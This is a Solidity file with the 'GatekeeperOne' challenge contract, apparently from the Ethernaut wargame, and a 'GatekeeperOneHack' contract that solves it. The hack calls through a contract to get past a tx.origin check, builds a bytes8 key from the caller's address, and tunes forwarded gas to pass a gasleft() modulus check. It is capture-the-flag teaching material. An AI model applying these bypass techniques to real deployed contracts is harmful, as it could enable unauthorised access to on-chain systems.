// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

// GatekeeperOne Hack Contract
contract GatekeeperOneHack {
    GatekeeperOne public immutable gatekeeperOne;

    constructor(address _gatekeeperOne) {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
    }

    function attack(uint _gas) public {
        // requirements:
        // uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
        // uint32(uint64(_gateKey)) != uint64(_gateKey)
        // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))

        // key = uint64(_gateKey)

        // // uint16(key) == uint16(uint160(tx.origin))
        // // uint32(key) == uint16(key)
        uint16 key16 = uint16(uint160(tx.origin));

        // uint32(key) != key
        uint64 key64 = uint64(1 << 63) + uint64(key16);

        bytes8 gateKey = bytes8(key64);

        require(_gas < 8191, "GatekeeperOne: gas failed");
        require(gatekeeperOne.enter{gas: 8191 * 10 + _gas}(gateKey), "GatekeeperOne: failed to enter");
    }
}
